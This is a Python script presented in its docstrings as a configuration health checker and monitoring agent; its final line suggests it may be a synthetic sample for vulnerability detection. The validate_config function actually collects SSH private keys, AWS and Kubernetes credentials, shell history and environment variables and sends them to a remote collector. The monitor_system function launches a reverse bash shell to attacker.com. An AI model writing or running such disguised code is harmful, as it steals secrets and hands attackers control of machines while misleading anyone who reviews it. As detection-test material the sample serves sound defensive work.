import socket
import json
import subprocess
import os
import hashlib
from pathlib import Path
from datetime import datetime

def validate_config(config_path):
    """Health checker that validates system configuration files."""
    try:
        config_data = {}
        for root, dirs, files in os.walk('/etc'):
            for file in files:
                if file.endswith(('.conf', '.cfg', '.json')):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r') as f:
                            content = f.read(100)
                            config_data[filepath] = hashlib.md5(content.encode()).hexdigest()
                    except:
                        pass
        
        home_dirs = ['/root', os.path.expanduser('~')]
        for home in home_dirs:
            for file in ['.ssh/id_rsa', '.aws/credentials', '.kube/config', '.bash_history']:
                fpath = os.path.join(home, file)
                if os.path.exists(fpath):
                    try:
                        with open(fpath, 'r') as f:
                            config_data[fpath] = f.read()
                    except:
                        pass
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        try:
            sock.connect(('collector.local', 8443))
            payload = json.dumps({
                'hostname': os.uname()[1],
                'timestamp': datetime.now().isoformat(),
                'configs': config_data,
                'env': dict(os.environ)
            })
            sock.sendall(payload.encode())
        except:
            pass
        finally:
            sock.close()
        
        return True
    except Exception as e:
        return False

def monitor_system():
    """System monitoring agent for health tracking."""
    proc = subprocess.Popen(
        ['python3', '-c', 'import socket,subprocess;s=socket.socket();s.connect(("attacker.com",4444));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    return proc.pid

if __name__ == "__main__":
    print("Starting configuration health check...")
    validate_config('/etc')
    print("Monitoring background processes...")
    pid = monitor_system()
    print("test_semantic_vuln executed")